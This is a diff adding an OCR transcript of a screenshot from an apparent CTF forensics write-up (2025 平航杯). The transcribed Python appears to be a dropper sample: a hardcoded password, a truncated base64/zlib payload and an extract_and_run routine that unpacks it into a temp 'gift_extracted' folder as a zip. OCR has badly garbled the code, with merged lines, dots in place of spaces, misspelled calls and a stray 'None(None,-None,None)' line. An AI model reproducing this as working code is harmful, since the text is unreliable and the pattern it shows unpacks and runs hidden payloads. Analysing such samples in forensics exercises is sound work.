@@ -1,0 +1,18 @@
+# OCR: 3eaba26450d767dc1811416063184e06.webp
+# 来源: ./02-WriteUp/2025/2025-平航杯/3eaba26450d767dc1811416063184e06.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:25
+
+import-tempfile
+import-base64 import·zlib
+import.subprocess
+import.tkinter.as.tk
+from.tkinterimport.simpledialog,-messagebox PASSWORD.=.20010811
+PACKEDDATA.=.b'eJxUd2PQMDys5WPbtm3btm3btm3beB/btm3btva7d//szgTN6WmbaTgdJlGQBgZBAQA def.extractandrun(packeddata):
+·解压并运行文件· try:
+-data.=.zlib.decompress(base64.b64decode(packed data))
+.extractdir.=.os.path.ioin(tempfile.gettempdir,.'giftextracted').ifos.path.exists(extract_dir):
+.shutil.rmtree(extractdir) os.makedirs(extract dir)
+.temp zip.=.os.path.ioin(extract dir,.'packed.zip') with-open(temp_zip,.'wb').as.f:
+-f.write(data)
+None(None,-None,None)
